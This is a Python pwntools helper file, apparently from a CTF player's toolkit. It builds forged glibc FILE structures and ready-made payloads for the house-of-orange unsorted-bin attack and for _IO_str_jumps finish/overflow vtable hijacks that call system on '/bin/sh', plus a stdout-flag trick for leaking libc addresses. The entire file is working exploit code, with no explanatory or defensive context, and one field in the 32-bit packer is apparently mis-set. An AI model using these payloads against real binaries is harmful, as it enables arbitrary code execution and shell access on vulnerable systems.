# -*- coding:utf-8 -*-
from pwn import *

def pack_file32(
        _flags = 0,
        _IO_read_ptr = 0,
        _IO_read_end = 0,
        _IO_read_base = 0,
        _IO_write_base = 0,
        _IO_write_ptr = 0,
        _IO_write_end = 0,
        _IO_buf_base = 0,
        _IO_buf_end = 0,
        _IO_save_base = 0,
        _IO_backup_base = 0,
        _IO_save_end = 0,
        _IO_marker = 0,
        _IO_chain = 0,
        _fileno = 0,
        _lock = 0,
    ):
    file_struct=p32(_flags) + \
                p32(_IO_read_ptr) + \
                p32(_IO_read_end) + \
                p32(_IO_read_base) + \
                p32(_IO_write_base) + \
                p32(_IO_write_ptr) + \
                p32(_IO_write_end) + \
                p32(_IO_buf_base) + \
                p32(_IO_buf_end) + \
                p32(_IO_save_base) + \
                p32(_IO_backup_base) + \
                p32(_IO_buf_end) +\
                p32(_IO_marker)+\
                p32(_IO_chain) + \
                p32(_fileno)
    file_struct=file_struct.ljust(0x48,'\x00')
    file_struct+=p32(_lock)
    file_struct=file_struct.ljust(0x94,'\x00')
    return file_struct

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _wide_data = 0,
              _mode = 0):
    file_struct = p32(_flags) + \
            p32(0) + \
            p64(_IO_read_ptr) + \
            p64(_IO_read_end) + \
            p64(_IO_read_base) + \
            p64(_IO_write_base) + \
            p64(_IO_write_ptr) + \
            p64(_IO_write_end) + \
            p64(_IO_buf_base) + \
            p64(_IO_buf_end) + \
            p64(_IO_save_base) + \
            p64(_IO_backup_base) + \
            p64(_IO_save_end) + \
            p64(_IO_marker) + \
            p64(_IO_chain) + \
            p32(_fileno)
    file_struct = file_struct.ljust(0x88, "\x00")
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, "\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, "\x00")
    return file_struct


    
def payload_IO_str_finish(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr,offset=-8):
    """
    house of orange
    溢出被free的unsortbin的结构
    offset为执行IO_str_jumps中的对应函数对应的偏移
    """
    payload = pack_file(_flags = 0, #prev size
                    _IO_read_ptr = 0x61, #smallbin4file_size
                    _IO_read_base = _IO_list_all_ptr-0x10, # unsorted bin attack _IO_list_all_ptr,
                    _IO_write_base = 0,
                    _IO_write_ptr = 1,
                    _IO_buf_base = binsh_addr,
                    _mode = 0,
                    )
    payload += p64(_IO_str_jumps_addr+offset)
    payload += p64(0) # paddding
    payload += p64(system_addr)
    return payload

def payload_IO_str_overflow(_IO_str_jumps_addr,_IO_list_all_ptr,system,bin_sh_addr,i=0,offset=0):
    if i==0:
        bin_sh_addr+=5 #使用sh来使binsh的地址为偶数，防止溢出
    payload=pack_file(
    _IO_buf_end = (bin_sh_addr - 0x64) / 2,
    _IO_buf_base = 0,
    _IO_write_ptr=0xffffffffffff0000,
    _IO_write_base =0,
    _mode = 0,
    _IO_read_ptr = 0x61, 
    _IO_read_base = _IO_list_all_ptr-0x10, 
    _flags=0
    )
    payload+=p64(_IO_str_jumps_addr+offset)+p64(system)
    return payload

def payload_IO_str_overflow32(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr,offset=4):
    """IO_list_all的值应当为可读可写，一般为file结构的结束地址即可（不是用于houseoforange）"""
    payload=pack_file32(
        _IO_buf_end = (binsh_addr - 0x64) / 2,
        _IO_write_base=1,
        _lock=_IO_list_all_ptr,
        _IO_read_base=0, #_IO_list_all_ptr-0x8,
        _IO_read_ptr = 0,#0x61, #未完待续，用于houseoforange
    )
    payload+=p32(_IO_str_jumps_addr+offset)+p32(system_addr)
    return payload

def ioleak(is32=False):
    if is32:
        # 0x11 bytes
        return p32(0xfbad3887)+p32(0)*3+'\x00'
    else:
        # 0x21 bytes
        return p64(0xfbad3887)+p64(0)*3+'\x00'